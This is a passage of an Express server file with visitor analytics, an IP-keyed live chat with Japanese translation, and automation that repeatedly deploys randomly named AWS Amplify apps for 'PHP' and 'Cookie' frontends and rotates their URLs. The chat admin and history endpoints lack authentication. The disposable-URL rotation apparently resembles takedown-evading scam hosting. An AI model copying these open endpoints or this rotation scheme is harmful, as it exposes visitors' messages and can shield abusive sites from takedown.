    res.status(500).json({ error: err.message });
  }
});

// ─── end IP enrichment ────────────────────────────────────────────

app.get("/admin/stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  res.write(": connected\n\n");

  sseClients.add(res);
  const keepalive = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(keepalive); }
  }, 25000);

  req.on("close", () => {
    clearInterval(keepalive);
    sseClients.delete(res);
  });
});

app.get("/admin", (_req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.get("/tracker.js", (_req, res) => {
  res.setHeader("Content-Type", "application/javascript");
  res.sendFile(path.join(__dirname, "tracker.js"));
});

// ─── end Analytics ────────────────────────────────────────────────

// ─── Chat ─────────────────────────────────────────────────────────

const CHAT_MAX_MSGS  = 200;
const CHAT_USER_TTL  = 30 * 24 * 3600;   // 30 days
const KEY_CHAT_USERS = "chat:users";

const keyChatUser = (ip) => `chat:user:${ip}`;
const keyChatMsgs = (ip) => `chat:msgs:${ip}`;

// SSE client sets
const chatAdminClients = new Set();
const chatUserClients  = new Map();   // ip → Set<res>

function broadcastChatAdmin(type, data) {
  if (!chatAdminClients.size) return;
  const msg = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of chatAdminClients) {
    try { res.write(msg); } catch { chatAdminClients.delete(res); }
  }
}
function broadcastChatUser(ip, type, data) {
  const clients = chatUserClients.get(ip);
  if (!clients?.size) return;
  const msg = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of clients) {
    try { res.write(msg); } catch { clients.delete(res); }
  }
}

// Google Translate unofficial — free, no API key
async function translateText(text, from, to) {
  try {
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=${from}&tl=${to}&dt=t&q=${encodeURIComponent(text)}`;
    const r   = await fetch(url, { headers: { "User-Agent": "Mozilla/5.0" } });
    const d   = await r.json();
    return (d[0] || []).map(x => x?.[0] || "").join("") || text;
  } catch { return text; }
}

function getChatIP(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim()
    || req.headers["x-real-ip"] || req.socket.remoteAddress || "unknown";
}

// ── Serve chat-widget.js ─────────────────────────────────────────
app.get("/chat-widget.js", (req, res) => {
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.sendFile(path.join(__dirname, "chat-widget.js"));
});

// ── Admin SSE stream ─────────────────────────────────────────────
app.get("/chat/stream/admin", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  res.write("event: connected\ndata: {}\n\n");
  chatAdminClients.add(res);
  req.on("close", () => chatAdminClients.delete(res));
});

// ── User SSE stream (identified by IP) ──────────────────────────
app.get("/chat/stream/user", (req, res) => {
  const ip = getChatIP(req);
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.flushHeaders();
  res.write(`event: connected\ndata: ${JSON.stringify({ ip })}\n\n`);

  if (!chatUserClients.has(ip)) chatUserClients.set(ip, new Set());
  chatUserClients.get(ip).add(res);
  broadcastChatAdmin("user-online", { ip });

  req.on("close", () => {
    const c = chatUserClients.get(ip);
    if (c) { c.delete(res); if (!c.size) chatUserClients.delete(ip); }
    broadcastChatAdmin("user-offline", { ip });
    redis.hset(keyChatUser(ip), "lastSeen", Date.now()).catch(() => {});
  });
});

// ── User sends message ───────────────────────────────────────────
app.post("/chat/send", async (req, res) => {
  try {
    const ip = getChatIP(req);
    const { message, name } = req.body || {};
    if (!message?.trim()) return res.status(400).json({ error: "message required" });

    const now = Date.now();
    const id  = now.toString(36) + Math.random().toString(36).slice(2, 6);

    // Auto-detect Japanese and translate to English for admin
    const isJP      = /[぀-ヿ㐀-䶿一-鿿＀-￯]/.test(message);
    const translated = isJP ? await translateText(message, "ja", "en") : null;

    const msg = { id, role: "user", text: message, translated, timestamp: now, read: false };

    // Store message
    await redis.rpush(keyChatMsgs(ip), JSON.stringify(msg));
    await redis.ltrim(keyChatMsgs(ip), -CHAT_MAX_MSGS, -1);
    await redis.expire(keyChatMsgs(ip), CHAT_USER_TTL);

    // Upsert user record
    const existed    = await redis.exists(keyChatUser(ip));
    const prevUnread = existed ? (Number(await redis.hget(keyChatUser(ip), "unread")) || 0) : 0;
    const storedName = existed ? (await redis.hget(keyChatUser(ip), "name") || "") : "";
    await redis.hmset(keyChatUser(ip), {
      ip,
      name:        name || storedName,
      lastMessage: message.slice(0, 120),
      lastActive:  now,
      lastSeen:    now,
      unread:      prevUnread + 1,
    });
    await redis.expire(keyChatUser(ip), CHAT_USER_TTL);
    await redis.zadd(KEY_CHAT_USERS, now, ip);

    const user = await redis.hgetall(keyChatUser(ip));
    broadcastChatAdmin("message", { ip, message: msg, user });

    res.json({ ok: true, id });
  } catch (err) {
    console.error("[chat/send]", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ── Admin sends message ──────────────────────────────────────────
app.post("/chat/admin/send", async (req, res) => {
  try {
    const { ip, message, translateToJP } = req.body || {};
    if (!ip || !message?.trim()) return res.status(400).json({ error: "ip and message required" });

    const now       = Date.now();
    const id        = now.toString(36) + Math.random().toString(36).slice(2, 6);
    const finalText = translateToJP ? await translateText(message, "en", "ja") : message;
    const msg       = {
      id, role: "admin",
      text: finalText,
      originalText: translateToJP ? message : null,
      timestamp: now,
    };

    await redis.rpush(keyChatMsgs(ip), JSON.stringify(msg));
    await redis.ltrim(keyChatMsgs(ip), -CHAT_MAX_MSGS, -1);
    await redis.expire(keyChatMsgs(ip), CHAT_USER_TTL);

    // Upsert user record so online-only users (who haven't sent a message yet)
    // appear in the contact list and persist after admin initiates the conversation.
    const existed = await redis.exists(keyChatUser(ip));
    if (!existed) {
      await redis.hmset(keyChatUser(ip), {
        ip, name: "", lastMessage: "", lastActive: now, lastSeen: now, unread: 0,
      });
      await redis.zadd(KEY_CHAT_USERS, now, ip);
    } else {
      await redis.hset(keyChatUser(ip), "lastAdminReply", now);
    }
    await redis.expire(keyChatUser(ip), CHAT_USER_TTL);

    broadcastChatUser(ip, "message", { message: msg });
    broadcastChatAdmin("admin-message", { ip, message: msg });  // sync other admin tabs

    res.json({ ok: true, id, message: msg });
  } catch (err) {
    console.error("[chat/admin/send]", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ── Get message history ──────────────────────────────────────────
app.get("/chat/messages/:ip", async (req, res) => {
  try {
    const ip  = decodeURIComponent(req.params.ip);
    const raw = await redis.lrange(keyChatMsgs(ip), 0, -1);
    const messages = raw.map(r => { try { return JSON.parse(r); } catch { return null; } }).filter(Boolean);
    res.json({ messages });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Get all chat users (admin contact list) ──────────────────────
app.get("/chat/users", async (req, res) => {
  try {
    const ips = await redis.zrevrange(KEY_CHAT_USERS, 0, 49);
    const pipeline = redis.pipeline();
    for (const ip of ips) pipeline.hgetall(keyChatUser(ip));
    const results = await pipeline.exec();
    const users = results
      .map(([, u]) => u)
      .filter(Boolean)
      .map(u => ({
        ...u,
        isOnline: chatUserClients.has(u.ip) && chatUserClients.get(u.ip).size > 0,
      }));
    res.json({ users });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Get currently online users (active SSE connections) ─────────
app.get("/chat/online", (req, res) => {
  const onlineIPs = Array.from(chatUserClients.keys());
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.json({ online: onlineIPs });
});

// ── Mark conversation as read ────────────────────────────────────
app.post("/chat/read/:ip", async (req, res) => {
  try {
    const ip = decodeURIComponent(req.params.ip);
    await redis.hset(keyChatUser(ip), "unread", 0);
    broadcastChatAdmin("read", { ip });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Typing indicators ────────────────────────────────────────────
app.post("/chat/typing", async (req, res) => {
  const ip = getChatIP(req);
  broadcastChatAdmin("typing", { ip, role: "user" });
  res.json({ ok: true });
});

app.post("/chat/admin/typing", async (req, res) => {
  const { ip } = req.body || {};
  if (ip) broadcastChatUser(ip, "typing", { role: "admin" });
  res.json({ ok: true });
});

// ─── end Chat ─────────────────────────────────────────────────────

// ─── Amplify Combined Automation ─────────────────────────────────────────────

// ── Env ──────────────────────────────────────────────────────────────────────
const AMPLIFY_ADMIN_KEY  = process.env.AMPLIFY_ADMIN_API_KEY || '';
const AMPLIFY_REGION     = process.env.AMPLIFY_AWS_REGION    || 'ap-northeast-1';
const AMPLIFY_CREDS      = process.env.AMPLIFY_AWS_ACCESS_KEY_ID ? {
  accessKeyId:     process.env.AMPLIFY_AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AMPLIFY_AWS_SECRET_ACCESS_KEY,
} : undefined;

const WAF_ARN_PHP    = process.env.WAF_ARN_PHP    || '';
const WAF_ARN_COOKIE = process.env.WAF_ARN_COOKIE || '';

const FRONTEND_REPO_PHP    = process.env.AMPLIFY_FRONTEND_REPO_PHP    || '';
const FRONTEND_REPO_COOKIE = process.env.AMPLIFY_FRONTEND_REPO_COOKIE || '';
const AMPLIFY_GITHUB_TOKEN = process.env.AMPLIFY_GITHUB_TOKEN         || '';

// Redis keys
const PHP_KEY_URL     = 'latest_amplify_url';
const PHP_KEY_TS      = 'latest_amplify_url:updated_at';
const PHP_KEY_HISTORY = 'amplify_url_history';
const COOKIE_KEY_URL     = 'amplify:current_url';
const COOKIE_KEY_TS      = 'amplify:updated_at';
const COOKIE_KEY_HISTORY = 'amplify:url_history';
const JOB_STATE_KEY      = 'amplify:job:current';
const AMP_HISTORY_MAX    = 50;

// ── AWS clients ───────────────────────────────────────────────────────────────
const amplifyClient = new AmplifyClient({ region: AMPLIFY_REGION, credentials: AMPLIFY_CREDS });
const wafClient     = new WAFV2Client({ region: 'us-east-1', credentials: AMPLIFY_CREDS });

// ── Auth middleware ───────────────────────────────────────────────────────────
function requireAmplifyKey(req, res, next) {
  if (!AMPLIFY_ADMIN_KEY || req.headers['x-admin-key'] !== AMPLIFY_ADMIN_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// ── Job state ─────────────────────────────────────────────────────────────────
let jobRunning   = false;
let jobCancelled = false;

async function saveJob(state) {
  await redis.set(JOB_STATE_KEY, JSON.stringify(state), 'EX', 86400);
}

// ── Frontend zip download ─────────────────────────────────────────────────────
async function downloadFrontendZip(repo) {
  const res = await fetch(`https://api.github.com/repos/${repo}/zipball/main`, {
    headers: {
      Authorization: `Bearer ${AMPLIFY_GITHUB_TOKEN}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'amplify-automation',
    },
    redirect: 'follow',
  });
  if (!res.ok) throw new Error(`GitHub ${res.status} downloading ${repo}`);

  const buf     = Buffer.from(await res.arrayBuffer());
  const zip     = new AdmZip(buf);
  const entries = zip.getEntries();
  if (!entries.length) throw new Error(`Empty zip for ${repo}`);

  const prefix = entries[0].entryName.split('/')[0] + '/';
  const out    = new AdmZip();
  for (const e of entries) {
    if (!e.isDirectory && e.entryName.startsWith(prefix)) {
      const name = e.entryName.slice(prefix.length);
      if (name) out.addFile(name, e.getData());
    }
  }
  return out.toBuffer();
}

// ── Deploy one Amplify app ────────────────────────────────────────────────────
async function createAndDeployApp(label, zipBuf, state, stepIdxBase, onProgress) {
  const suffix  = Math.random().toString(36).slice(2, 8);
  const appName = `${label}-${suffix}-${new Date().toISOString().slice(0, 10).replace(/-/g, '')}`;

  await onProgress(stepIdxBase, 'in_progress', `Creating ${appName}…`);
  const created = await amplifyClient.send(new CreateAppCommand({ name: appName, platform: 'WEB' }));
  const appId   = created.app.appId;
  await amplifyClient.send(new CreateBranchCommand({ appId, branchName: 'main', stage: 'PRODUCTION' }));
  await onProgress(stepIdxBase, 'completed', appId);

  await onProgress(stepIdxBase + 1, 'in_progress', 'Uploading zip…');
  const deploy    = await amplifyClient.send(new CreateDeploymentCommand({ appId, branchName: 'main' }));
  const jobId     = deploy.jobId;
  const uploadUrl = deploy.zipUploadUrl;

  const upRes = await fetch(uploadUrl, { method: 'PUT', body: zipBuf, headers: { 'Content-Type': 'application/zip' } });
  if (!upRes.ok) throw new Error(`Zip upload failed (HTTP ${upRes.status})`);
  await amplifyClient.send(new StartDeploymentCommand({ appId, branchName: 'main', jobId }));
  await onProgress(stepIdxBase + 1, 'completed');

  await onProgress(stepIdxBase + 2, 'in_progress', 'Waiting for build…');
  for (let i = 1; i <= 30; i++) {
    await new Promise(r => setTimeout(r, 30_000));
    if (jobCancelled) throw new Error('Job cancelled by user');
    const j      = await amplifyClient.send(new GetAmplifyJobCommand({ appId, branchName: 'main', jobId }));
    const status = j.job.summary.status;
    await onProgress(stepIdxBase + 2, 'in_progress', `[${i}/30] ${status}`);
    if (status === 'SUCCEED')                              { await onProgress(stepIdxBase + 2, 'completed'); break; }
    if (status === 'FAILED' || status === 'CANCELLED')     throw new Error(`${label} build ${status}`);
    if (i === 30)                                          throw new Error(`${label} deployment timed out`);
  }

  const appInfo = await amplifyClient.send(new GetAppCommand({ appId }));
  const appUrl  = `https://main.${appInfo.app.defaultDomain}`;
  return { appId, appUrl };
}

// ── Attach + verify WAF ───────────────────────────────────────────────────────
async function attachAndVerifyWaf(appId, wafArn, onProgress, stepIdx) {
  const resourceArn = `arn:aws:amplify:${AMPLIFY_REGION}:${ACCOUNT_ID}:apps/${appId}`;

  // Attach WAF once — fail immediately if it errors
  await onProgress(stepIdx, 'in_progress', 'Attaching…');
  try {
    await wafClient.send(new AssociateWebACLCommand({ WebACLArn: wafArn, ResourceArn: resourceArn }));
  } catch (err) {
    throw new Error(`WAF attachment failed: ${err.message}`);
  }
  await onProgress(stepIdx, 'completed');

  // Wait 4 min for WAF to propagate
  await countdown(4, onProgress, stepIdx + 1);
}

// ── Countdown sleep ───────────────────────────────────────────────────────────
async function countdown(minutes, onProgress, stepIdx) {
  await onProgress(stepIdx, 'in_progress', `${minutes}m remaining…`);
  for (let m = minutes; m > 0; m--) {
    await new Promise(r => setTimeout(r, 60_000));
    if (jobCancelled) throw new Error('Job cancelled by user');
    const rem = m - 1;
    await onProgress(stepIdx, rem > 0 ? 'in_progress' : 'completed', rem > 0 ? `${rem}m remaining…` : 'Done');
  }
}

// ── Step names ────────────────────────────────────────────────────────────────
const STEP_NAMES = [
  'Download PHP frontend',          // 0
  'Create PHP Amplify App',         // 1
  'Deploy PHP frontend',            // 2
  'Wait for PHP build',             // 3
  'Attach WAF (PHP)',               // 4
  'Wait 4 min (PHP WAF)',           // 5
  'Update PHP Redis URL',           // 6
  'Download Cookie frontend',       // 7
  'Create Cookie Amplify App',      // 8
  'Deploy Cookie frontend',         // 9
  'Wait for Cookie build',          // 10
  'Attach WAF (Cookie)',            // 11
  'Wait 4 min (Cookie WAF)',        // 12
  'Update Cookie Redis URL',        // 13
];

// ── Main combined job ─────────────────────────────────────────────────────────
async function runCombinedJob(jobId) {
  jobCancelled = false;
  const state = {
    jobId,
    status: 'running',
    startedAt: new Date().toISOString(),
    finishedAt: null,
    error: null,
    phpAppId: null, phpAppUrl: null,
    cookieAppId: null, cookieAppUrl: null,
    steps: STEP_NAMES.map(name => ({ name, status: 'pending', detail: null })),
  };
  await saveJob(state);

  async function onProgress(idx, status, detail = null) {
    state.steps[idx] = { name: STEP_NAMES[idx], status, detail };
    await saveJob(state);
  }

  try {
    // 0. Download PHP frontend
    await onProgress(0, 'in_progress');
    const phpZip = await downloadFrontendZip(FRONTEND_REPO_PHP);
    await onProgress(0, 'completed', `${Math.round(phpZip.length / 1024)}KB`);

    // 1-3. Create + deploy PHP app
    const { appId: phpAppId, appUrl: phpAppUrl } =
      await createAndDeployApp('php', phpZip, state, 1, onProgress);
    state.phpAppId  = phpAppId;
    state.phpAppUrl = phpAppUrl;
    await saveJob(state);

    // 4-5. Attach + verify WAF (PHP)
    await attachAndVerifyWaf(phpAppId, WAF_ARN_PHP, onProgress, 4);

    // 6. Update PHP Redis URL
    await onProgress(6, 'in_progress');
    const nowPhp = new Date().toISOString();
    const oldPhpUrl = await redis.get(PHP_KEY_URL);
    if (oldPhpUrl && oldPhpUrl !== phpAppUrl) {
      await redis.lpush(PHP_KEY_HISTORY, JSON.stringify({ url: oldPhpUrl, createdAt: nowPhp }));
      await redis.ltrim(PHP_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    }
    await redis.mset(PHP_KEY_URL, phpAppUrl, PHP_KEY_TS, nowPhp);
    await onProgress(6, 'completed');

    // 7. Download Cookie frontend
    await onProgress(7, 'in_progress');
    const cookieZip = FRONTEND_REPO_COOKIE === FRONTEND_REPO_PHP
      ? phpZip
      : await downloadFrontendZip(FRONTEND_REPO_COOKIE);
    await onProgress(7, 'completed', `${Math.round(cookieZip.length / 1024)}KB`);

    // 8-10. Create + deploy Cookie app
    const { appId: cookieAppId, appUrl: cookieAppUrl } =
      await createAndDeployApp('cookie', cookieZip, state, 8, onProgress);
    state.cookieAppId  = cookieAppId;
    state.cookieAppUrl = cookieAppUrl;
    await saveJob(state);

    // 11-12. Attach WAF (Cookie) + wait 4 min
    await attachAndVerifyWaf(cookieAppId, WAF_ARN_COOKIE, onProgress, 11);

    // 13. Update Cookie Redis URL
    await onProgress(13, 'in_progress');
    const nowCookie = new Date().toISOString();
    const oldCookieUrl = await redis.get(COOKIE_KEY_URL);
    if (oldCookieUrl && oldCookieUrl !== cookieAppUrl) {
      await redis.lpush(COOKIE_KEY_HISTORY, JSON.stringify({ url: oldCookieUrl, createdAt: nowCookie }));
      await redis.ltrim(COOKIE_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    }
    await redis.mset(COOKIE_KEY_URL, cookieAppUrl, COOKIE_KEY_TS, nowCookie);
    await onProgress(13, 'completed');

    state.status     = 'completed';
    state.finishedAt = nowCookie;
    await saveJob(state);
    console.log(`[amplify-job] ${jobId} done — PHP: ${phpAppUrl} | Cookie: ${cookieAppUrl}`);

  } catch (err) {
    const wasCancelled = err.message === 'Job cancelled by user';
    state.status     = wasCancelled ? 'cancelled' : 'failed';
    state.error      = err.message;
    state.finishedAt = new Date().toISOString();
    for (const s of state.steps) { if (s.status === 'in_progress') s.status = wasCancelled ? 'cancelled' : 'failed'; }
    await saveJob(state);
    console.log(`[amplify-job] ${jobId} ${state.status}: ${err.message}`);
  } finally {
    jobRunning   = false;
    jobCancelled = false;
  }
}

// ── Shared helpers ────────────────────────────────────────────────────────────
function parseAmpHistory(raw) {
  return (raw || []).map(item => {
    try {
      let p = JSON.parse(item);
      if (typeof p === 'string') p = JSON.parse(p);
      return typeof p === 'object' && p.url ? p : { url: String(p), createdAt: null };
    } catch { return { url: String(item || ''), createdAt: null }; }
  }).filter(x => x.url);
}

// ── Routes ────────────────────────────────────────────────────────────────────

// POST /api/amplify/run-combined
app.post('/api/amplify/run-combined', requireAmplifyKey, (req, res) => {
  if (jobRunning) return res.status(409).json({ error: 'A job is already running' });
  const jobId = `job-${Date.now()}`;
  jobRunning = true;
  runCombinedJob(jobId);
  res.json({ jobId });
});

// POST /api/amplify/cancel-job
app.post('/api/amplify/cancel-job', requireAmplifyKey, (req, res) => {
  if (!jobRunning) return res.status(409).json({ error: 'No job is running' });
  jobCancelled = true;
  res.json({ ok: true });
});

// GET /api/amplify/job-status
app.get('/api/amplify/job-status', requireAmplifyKey, async (req, res) => {
  try {
    const raw   = await redis.get(JOB_STATE_KEY);
    const state = raw ? JSON.parse(raw) : null;
    res.json({ state, running: jobRunning });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/amplify/php/current-url
app.get('/api/amplify/php/current-url', requireAmplifyKey, async (req, res) => {
  try {
    const [url, updatedAt] = await Promise.all([redis.get(PHP_KEY_URL), redis.get(PHP_KEY_TS)]);
    res.json({ url, updatedAt });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/amplify/php/update-url
app.post('/api/amplify/php/update-url', requireAmplifyKey, async (req, res) => {
  const { url } = req.body || {};
  if (!url) return res.status(400).json({ error: '"url" required' });
  try {
    const now    = new Date().toISOString();
    const oldUrl = await redis.get(PHP_KEY_URL);
    if (oldUrl && oldUrl !== url) {
      await redis.lpush(PHP_KEY_HISTORY, JSON.stringify({ url: oldUrl, createdAt: now }));
      await redis.ltrim(PHP_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    }
    await redis.mset(PHP_KEY_URL, url, PHP_KEY_TS, now);
    res.json({ success: true, url, updatedAt: now });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// GET /api/amplify/php/history
app.get('/api/amplify/php/history', requireAmplifyKey, async (req, res) => {
  try {
    const raw = await redis.lrange(PHP_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    res.json({ history: parseAmpHistory(raw) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/amplify/php/delete-apps
app.post('/api/amplify/php/delete-apps', requireAmplifyKey, async (req, res) => {
  const { appIds } = req.body || {};
  if (!Array.isArray(appIds) || !appIds.length) return res.status(400).json({ error: '"appIds" required' });
  try {
    const raw = await redis.lrange(PHP_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    for (const entry of (raw || [])) {
      if (appIds.some(id => entry.includes(id))) await redis.lrem(PHP_KEY_HISTORY, 0, entry);
    }
  } catch { /* non-fatal */ }
  const results = await Promise.all(appIds.map(async appId => {
    try {
      await amplifyClient.send(new DeleteAmplifyAppCommand({ appId }));
      return { appId, success: true };
    } catch (err) { return { appId, success: false, error: err.message }; }
  }));
  res.json({ results });
});

// GET /api/amplify/cookie/current-url
app.get('/api/amplify/cookie/current-url', requireAmplifyKey, async (req, res) => {
  try {
    const [url, updatedAt] = await Promise.all([redis.get(COOKIE_KEY_URL), redis.get(COOKIE_KEY_TS)]);
    res.json({ url, updatedAt });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/amplify/cookie/update-url
app.post('/api/amplify/cookie/update-url', requireAmplifyKey, async (req, res) => {
  const { url } = req.body || {};
  if (!url) return res.status(400).json({ error: '"url" required' });
  try {
    const now    = new Date().toISOString();
    const oldUrl = await redis.get(COOKIE_KEY_URL);
    if (oldUrl && oldUrl !== url) {
      await redis.lpush(COOKIE_KEY_HISTORY, JSON.stringify({ url: oldUrl, createdAt: now }));
      await redis.ltrim(COOKIE_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    }
    await redis.mset(COOKIE_KEY_URL, url, COOKIE_KEY_TS, now);
    res.json({ success: true, url, updatedAt: now });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// GET /api/amplify/cookie/history
app.get('/api/amplify/cookie/history', requireAmplifyKey, async (req, res) => {
  try {
    const raw = await redis.lrange(COOKIE_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    res.json({ history: parseAmpHistory(raw) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/amplify/cookie/delete-apps
app.post('/api/amplify/cookie/delete-apps', requireAmplifyKey, async (req, res) => {
  const { appIds } = req.body || {};
  if (!Array.isArray(appIds) || !appIds.length) return res.status(400).json({ error: '"appIds" required' });
  try {
    const raw = await redis.lrange(COOKIE_KEY_HISTORY, 0, AMP_HISTORY_MAX - 1);
    for (const entry of (raw || [])) {
      if (appIds.some(id => entry.includes(id))) await redis.lrem(COOKIE_KEY_HISTORY, 0, entry);
    }
  } catch { /* non-fatal */ }
  const results = await Promise.all(appIds.map(async appId => {
    try {
      await amplifyClient.send(new DeleteAmplifyAppCommand({ appId }));
      return { appId, success: true };
    } catch (err) { return { appId, success: false, error: err.message }; }
  }));
  res.json({ results });
});

// ─── end Amplify Combined Automation ─────────────────────────────────────────

app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  try {
    const originGroups = await getOriginGroups();
    for (const [group, entries] of Object.entries(originGroups)) {
      console.log(`  [${group}] ${Object.keys(entries).length} origins`);
    }
  } catch (e) {
    console.error("[boot] failed to log origin groups:", e.message);
  }
});
